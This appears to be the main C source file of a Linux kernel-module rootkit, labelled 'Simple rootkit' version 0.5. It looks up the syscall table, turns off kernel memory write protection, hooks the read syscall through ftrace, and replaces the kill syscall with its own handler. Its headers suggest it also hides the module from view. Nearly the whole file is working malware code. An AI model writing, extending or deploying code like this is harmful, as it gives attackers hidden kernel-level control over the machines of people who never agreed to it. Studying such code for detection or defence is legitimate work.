#include <linux/init.h>     // __init and __exit
#include <linux/module.h>   // For loading LKM into the kernel
#include <linux/kernel.h>   // Types, macros, functions for the kernel
#include <linux/kallsyms.h> // Contains kallsysm_lookup_name function
#include <linux/unistd.h>   // Syscalls numbers
#include <linux/slab.h>     // Allocate/free kernel memory
#include <linux/dirent.h>
#include "memory_prot.h"
#include "utils.h"
#include "hide_module.h"
#include "my_syscalls.h"
#include "ftrace_utils.h"

// Module Information
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jakub Pilimon");
MODULE_DESCRIPTION("Simple rootkit.");
MODULE_VERSION("0.5");


short visiblity = VISIBLE;
unsigned long *sys_call_table;

struct list_head *prev_module;
kallsyms_lookup_name_t kallsyms_lookup_name_;

pt_regs_t orig_read;

asmlinkage unsigned long my_read(const struct pt_regs *regs) {
        return orig_read(regs);
}

static struct ftrace_hook hooks[] = {
        HOOK("__x64_sys_read", my_read, &orig_read)
};



static int __init mod_init(void) {
        printk(KERN_INFO "rootkit: Initializing...\n");
        sys_call_table = get_sys_call_table_addr();
        kallsyms_lookup_name_ = get_kallsyms_lookup_name();


        if (sys_call_table == NULL) {
                printk(KERN_INFO "rootkit: sys_call_table lookup failed.\n");
                return 1;
        }

        fh_install_hooks(hooks, ARRAY_SIZE(hooks));

        disable_memory_protection();

        orig_kill = (pt_regs_t) sys_call_table[__NR_kill];
        sys_call_table[__NR_kill] = (unsigned long) my_kill;

        enable_memory_protection();

        return 0;
}


static void __exit mod_exit(void) {
        disable_memory_protection();

        sys_call_table[__NR_kill] = (unsigned long) orig_kill;

        enable_memory_protection();

        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

        printk(KERN_INFO "rootkit: Exiting...\n");
}

module_init(mod_init);
module_exit(mod_exit);
